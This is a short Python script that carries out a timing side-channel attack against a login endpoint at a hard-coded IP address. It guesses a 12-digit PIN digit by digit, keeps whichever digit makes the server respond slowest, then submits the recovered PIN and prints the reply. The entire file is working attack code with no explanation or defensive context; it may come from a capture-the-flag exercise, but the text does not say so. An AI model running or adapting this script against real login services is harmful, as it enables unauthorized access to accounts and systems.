import sys
import requests

url = "http://54.76.245.171/login"
pin = [0] * 12

for i in range(0, len(pin)):
    longest_time = 0
    for j in range(0, 10):
        pin_try = pin.copy()
        pin_try[i] = j
        pin_try = ''.join(map(str, pin_try))

        print("Trying pin: " + pin_try, end="\r")

        response = requests.post(url, json={"pin": pin_try})
        elapsed_time = response.elapsed.total_seconds()

        if elapsed_time > longest_time:
            longest_time = elapsed_time
            pin[i] = j

pin = ''.join(map(str, pin))
print("Found correct pin: " + pin)
response = requests.post(url, json={"pin": pin})
print(response.json())
